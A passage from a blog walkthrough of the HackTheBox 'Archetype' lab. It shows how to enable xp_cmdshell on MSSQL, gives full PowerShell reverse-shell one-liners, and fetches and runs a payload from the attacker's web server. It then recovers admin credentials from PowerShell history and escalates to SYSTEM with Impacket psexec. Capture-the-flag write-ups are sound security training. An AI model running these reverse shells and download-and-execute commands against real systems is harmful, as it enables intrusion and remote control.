+SQL&gt;</code></pre><p>According to the return value (1 = login is a member of role.) yes we have highest privileges.😁 This will allow us to enable <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" rel="noopener noreferrer"><code>xp_cmdshell</code></a> and gain RCE on the host.</p><p>Check below awesome blog posts to understand that trick.</p><ul><li>Pentesting MSSQL - Microsoft SQL Server <a href="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server" rel="noopener noreferrer">https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server</a></li><li>MySQL Information Gathering <a href="https://sqlwiki.netspi.com/attackQueries/informationGathering/#mysql" rel="noopener noreferrer">https://sqlwiki.netspi.com/attackQueries/informationGathering/#mysql</a></li></ul><h3 id="022-usage-of-xpcmdshell">02.2 Usage of  xp_cmdshell</h3><p>To get <code>xp_cmdshell</code>, type below commands.</p><pre><code class="language-sql">EXEC sp_configure 'Show Advanced Options', 1; 
+reconfigure; 
+sp_configure; 
+EXEC sp_configure 'xp_cmdshell', 1 
+reconfigure; 
+xp_cmdshell "whoami"</code></pre><pre><code class="language-sql">SQL&gt; xp_cmdshell "whoami"
+output
+
+--------------------------------------------------------------------------------
+
+archetype\sql_svc
+
+NULL</code></pre><p>However, Now we can run system commands using `xp_cmdshell`. why can't we get proper shell. 🤠</p><p>Hmmmmah !! what a nice smell for powershell reverse-shell huh! 😍</p><p>You can get some idea about reverse shells from below links,</p><ul><li>Reverse Shell Generator <a href="https://www.revshells.com/" rel="noopener noreferrer">https://www.revshells.com</a>​</li><li>Nishang framework <a href="https://github.com/samratashok/nishang" rel="noopener noreferrer">https://github.com/samratashok/nishang</a>​</li><li>TCP port communications with PowerShell <a href="https://livebook.manning.com/book/powershell-deep-dives/chapter-4/" rel="noopener noreferrer">https://livebook.manning.com/book/powershell-deep-dives/chapter-4</a>​</li></ul><p>But personally, I like to use Nishang's <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1" rel="noopener noreferrer">Invoke-PowerShellTcpOneLine.ps1</a> to create my rev-shell.</p><p>After deleting all comments and unwanted things, powershell script will be like this. 👇</p><pre><code class="language-bash">$client = New-Object System.Net.Sockets.TCPClient('YourIP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+$sm=(New-Object Net.Sockets.TCPClient('YourIP',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2&gt;&amp;1));$sm.Write($st,0,$st.Length)}</code></pre><blockquote>Remember: Type <strong><strong><code>ifconfig tun0</code> </strong></strong>and replace<strong><strong> YourIP</strong></strong></blockquote><h3 id="023-get-reverse-shell"><strong>02.3 Get Reverse Shell</strong></h3><p>Now time to get reverse shell. Save above powershell script as anyname.ps1 (here I use script.ps1) and power up mini webserver. I'm a very lasy man you know 🙄 so here I use <a href="https://github.com/sc0tfree/updog" rel="noopener noreferrer"><code>updog</code> </a>instead of typing long shit in python 😑</p><blockquote>Updog is a replacement for Python's <code>SimpleHTTPServer</code>. It allows uploading and downloading via HTTP/S, can set ad hoc SSL certificates and use HTTP basic auth.source : <a href="https://github.com/sc0tfree/updog" rel="noopener noreferrer">https://github.com/sc0tfree/updog</a>​root in</blockquote><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype 🐍 v3.9.2
+⚡❯ updog
+[+] Serving /root/Documents/HackThebox/Archetype...
+ * Running on http://0.0.0.0:9090/ (Press CTRL+C to quit)</code></pre><p>To listen the connection, I always use the swiss army knife (`<strong><strong>netcat</strong>`<strong>) </strong></strong>tool. personally I do not like to get shell through multi handler (`metasploit`). Trust me, using netcat tool you can learn a lot of things beyond metaspolit. 👽</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype 🐍 v3.9.2
+⚡❯ nc -lvnp 4444
+ listening on [any] 4444 ... </code></pre><hr><h1 id="03-exploit-the-target-%E2%80%A6"><strong>03. Exploit the target …</strong></h1><p>Now we can issue the command to download and execute the reverse shell through <code>xp_cmdshell</code>.</p><pre><code class="language-bash">EXEC xp_cmdshell 'echo IEX (New-Object Net.WebClient).DownloadString("http://10.10.16.39:9090/script.ps1") | powershell -noprofile'
+</code></pre><p>I divided up my terminal up to 3 parts using  <a href="https://github.com/tmux/tmux/wiki" rel="noopener noreferrer">Tmux</a> multiplexer.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYKZ_p9uWcJk-xmystC%2F-MYLHaXzk27LyhbgDjUf%2Fimage.png?alt=media&amp;token=0fa21382-731a-4469-911e-4a8d5ec43a1e" class="kg-image" alt loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="outline: none; box-sizing: inherit; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; line-height: 1.625; max-width: 100%;">RevShell</span></figcaption></figure><p>Woooh!!! We got our shell. 💀 A shell is received as <strong><strong><code>sql_svc</code></strong></strong>, and we can get the user.txt flag. </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYKZ_p9uWcJk-xmystC%2F-MYLIl1OHkcfDhlSqmNy%2Fimage.png?alt=media&amp;token=4160f34e-df3f-48ca-bc15-0e59feca779b" class="kg-image" alt loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="outline: none; box-sizing: inherit; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; line-height: 1.625; max-width: 100%;">user.txt</span></figcaption></figure><hr><h1 id="04-privilege-escalation-%E2%80%A6"><strong>04. Privilege Escalation …</strong></h1><p>To escalate privileges we can run different tools. By the way, before run any tool there are some steps that you need to run to enumerate some information. I will be showing you one by one in each walkthroughs.</p><p>Did you remember? now we are in service account called <strong><strong><code>sql_svc</code>. </strong></strong>It's good practice to check recently accessed files/executed commands (<em>Keep in mind as good practice</em>).  Mostly (default) our console history will be saved in <code>C:\Users\&lt;account_name&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code> . Now you understand what our next step is.</p><p>Right, Let's check above file using type command. type</p><pre><code class="language-bash">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+</code></pre><p>Here is the output 👇</p><pre><code class="language-bash">PS C:\Users\Administrator&gt; type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+PS C:\Users\Administrator&gt;</code></pre><p>Oh no no no noooo.. You see?</p><p>The backup share is mapped with admin credentials. Remember if you saw something like this. ready to launch Impacket's <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py" rel="noopener noreferrer"><code>psexec.py</code></a> script.</p><pre><code class="language-bash">python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.10.10.27
+</code></pre><p>Here is the output 👇</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype 🐍 v3.9.2
+⚡❯ python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.10.10.27
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.27.....
+[*] Found writable share ADMIN$
+[*] Uploading file gZiCFMKg.exe
+[*] Opening SVCManager on 10.10.10.27.....
+[*] Creating service FuWR on 10.10.10.27.....
+[*] Starting service FuWR.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+nt authority\system
+
+C:\Windows\system32&gt;</code></pre><p>Finally we have Administrator Privileges. 👌 Now we can access the flag on the administrator desktop.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYKZ_p9uWcJk-xmystC%2F-MYLP7ji_aKDAJVwtM3-%2Fimage.png?alt=media&amp;token=34f7112a-ba5b-4bd0-a2ae-c1d030b68a25" class="kg-image" alt loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="outline: none; box-sizing: inherit; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; line-height: 1.625; max-width: 100%;">root.txt</span></figcaption></figure><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-M_zEsWTNjRcuOaViQsC%2F-M_zFfzCHXa8Hugk-ADS%2Fimage.png?alt=media&amp;token=93d84b32-2d92-43ab-adf3-f9e1270cb647" class="kg-image" alt loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-5.png" class="kg-image" alt loading="lazy" width="292" height="172"></figure><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>
+                <section class="m-tags in-post">
+                  <h3 class="m-submenu-title">Tags</h3>
+                  <ul>
+                      <li>
+                        <a href="../tag/startingpoint/index.html" title="StartingPoint">StartingPoint</a>
+                      </li>
+                      <li>
+                        <a href="../tag/hackthebox/index.html" title="HackTheBox">HackTheBox</a>
+                      </li>
+                      <li>
+                        <a href="../tag/archetype-walkthrough/index.html" title="Archetype Walkthrough">Archetype Walkthrough</a>
+                      </li>
+                      <li>
+                        <a href="../tag/h4rithd/index.html" title="h4rithd">h4rithd</a>
+                      </li>
+                      <li>
+                        <a href="../tag/harithdilshan/index.html" title="HarithDilshan">HarithDilshan</a>
+                      </li>
+                  </ul>
+                </section>
+            </div>
+          </div>
+        </div>
+        <section class="m-subscribe-section js-newsletter">
+          <div class="l-wrapper in-post">
+            <div class="m-subscribe-section__content">
+              <div class="m-subscribe-section__text">
+                <h4 class="m-subscribe-section__title">Subscribe to our newsletter</h4>
+                <p class="m-subscribe-section__description">
+                  Get the latest posts delivered right to your inbox.
+                </p>
+              </div>
+              <div class="m-subscribe-section__form">
+                
+<div class="m-subscribe-section__form">
+  <form data-members-form="subscribe" id="newsletter-form" class="m-subscribe-section__container">
+    <div class="m-subscribe__form">
+      <div class="pos-relative">
+        <label for="newsletter-input" class="sr-only">Your email address</label>
+        <input data-members-email id="newsletter-input" class="m-input in-subscribe-section" type="email"
+          placeholder="Your email address" required />
+      </div>
+      <button id="newsletter-button" class="m-button primary block" type="submit">Subscribe</button>
+    </div>
+    <div class="m-subscribe__success">
+      <header class="m-heading no-margin">
+        <img src="../assets/images/success.png%3Fv=5e4dc0b160" alt="Success!" class="m-subscribe__success_icon">
+        <p class="m-heading__description in-newsletter-form">
+          Now check your inbox and click the link to confirm your subscription.
+        </p>
+      </header>
+    </div>
+    <p class="m-subscribe__invalid m-small-text">
+      Please enter a valid email address
+    </p>
+    <p class="m-subscribe__error m-small-text">
+      Oops! There was an error sending the email, please try later.
+    </p>
+  </form>
+</div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="m-author">
+          <div class="m-author__content">
+            <div class="m-author__picture">
+              <a href="../author/harith/index.html" class="m-author-picture" aria-label="Harith Dilshan">
+                  <div style="background-image: url(../content/images/2021/05/176773693_2267679413366261_3955357600281674809_n-2.jpg);"></div>
+              </a>
+            </div>
+            <div class="m-author__info">
+              <h4 class="m-author__name">
+                <a href="../author/harith/index.html">Harith Dilshan</a>
+              </h4>
+              <ul class="m-author-links">
+              </ul>
+            </div>
+          </div>
+        </section>
+          <section class="m-recommended">
+            <div class="l-wrapper in-recommended">
+              <h3 class="m-section-title in-recommended">Recommended for you</h3>
+              <div class="m-recommended-articles">
+                <div class="m-recommended-slider glide js-recommended-slider">
+                  <div class="glide__track" data-glide-el="track">
+                    <div class="glide__slides">
+                      
+    <div class="m-recommended-slider__item glide__slide">
+      <div class="m-heading no-margin">
+        <h3>No posts found</h3>
+        <p>
+          Apparently there are no posts at the moment, check again later.
+        </p>
+      </div>
+    </div>
+                    </div>
+                  </div>
+                  <div data-glide-el="controls" class="glide__arrows js-controls">
+                    <button data-glide-dir="<" class="m-icon-button filled in-recommended-articles glide-prev" aria-label="Previous">
+                      <span class="icon-arrow-left" aria-hidden="true"></span>
+                    </button>
+                    <button data-glide-dir=">" class="m-icon-button filled in-recommended-articles glide-next" aria-label="Next">
+                      <span class="icon-arrow-right" aria-hidden="true"></span>
+                    </button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+    </div>
+  </article>
+</main>
+
+
+
+    
+<div class="m-search js-search" role="dialog" aria-modal="true" aria-label="Search">
+  <button class="m-icon-button outlined as-close-search js-close-search" aria-label="Close search">
+    <span class="icon-close" aria-hidden="true"></span>
+  </button>
+  <div class="m-search__content">
+    <form class="m-search__form">
+      <div class="pos-relative">
+        <span class="icon-search m-search-icon" aria-hidden="true"></span>
+        <label for="search-input" class="sr-only">
+          Type to search
+        </label>
+        <input id="search-input" type="text" class="m-input in-search js-input-search" placeholder="Type to search">
+      </div>
+    </form>
+    <div class="js-search-results hide"></div>
+    <p class="m-not-found align-center hide js-no-results">
+      No results for your search, please try with something else.
+    </p>
+  </div>
+</div>
+
+    
+<footer class="m-footer">
+  <div class="m-footer__content">
+    <nav class="m-footer-social">
+        <a href="https://www.facebook.com/ShapManasick" target="_blank" rel="noopener" aria-label="Facebook">
+          <span class="icon-facebook" aria-hidden="true"></span>
+        </a>
+        <a href="https://twitter.com/h4rithd" target="_blank" rel="noopener" aria-label="Twitter">
+          <span class="icon-twitter" aria-hidden="true"></span>
+        </a>
+      <a href="http://192.168.8.3:2368/rss" aria-label="RSS">
+        <span class="icon-rss" aria-hidden="true"></span>
+      </a>
+    </nav>
+    <p class="m-footer-copyright">
+      <span>h4rithd.com &copy; 2021</span>
+      <span>&nbsp; &bull; &nbsp;</span>
+      <span>Published with <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a></span>
+    </p>
+    <p class="m-footer-copyright jslicense">
+      <a href="../assets/html/javascript.html%3Fv=5e4dc0b160.html" rel="jslicense">JavaScript license information</a>
+    </p>
+  </div>
+</footer>
+
+    <div class="m-alert success subscribe js-alert" data-notification="subscribe">
+  Great! You&#x27;ve successfully subscribed.
+  <button class="m-alert__close js-notification-close" aria-label="Close">
+    <span class="icon-close"></span>
+  </button>
+</div>
+
+<div class="m-alert success signup js-alert" data-notification="signup">
+  Great! Next, complete checkout for full access.
+  <button class="m-alert__close js-notification-close" aria-label="Close">
+    <span class="icon-close"></span>
+  </button>
+</div>
+
+<div class="m-alert success signin js-alert" data-notification="signin">
+  Welcome back! You&#x27;ve successfully signed in.
+  <button class="m-alert__close js-notification-close" aria-label="Close">
+    <span class="icon-close"></span>
+  </button>
+</div>
+
+<div class="m-alert success checkout js-alert" data-notification="checkout">
+  Success! Your account is fully activated, you now have access to all content.
+  <button class="m-alert__close js-notification-close" aria-label="Close">
+    <span class="icon-close"></span>
+  </button>
+</div>
+    <script crossorigin="anonymous" src="https://polyfill.io/v3/polyfill.min.js?features=IntersectionObserver%2CPromise%2CArray.prototype.includes%2CString.prototype.endsWith%2CString.prototype.startsWith%2CObject.assign%2CNodeList.prototype.forEach"></script>
+    <script defer src="../assets/js/manifest.js%3Fv=5e4dc0b160"></script>
+    <script defer src="../assets/js/vendor/content-api.min.js%3Fv=5e4dc0b160"></script>
+    <script defer src="../assets/js/vendor.js%3Fv=5e4dc0b160"></script>
+    <script defer src="../assets/js/app.js%3Fv=5e4dc0b160"></script>
+
+      <script defer src="../assets/js/post.js%3Fv=5e4dc0b160"></script>
+
+
+    
+  </body>
+</html>
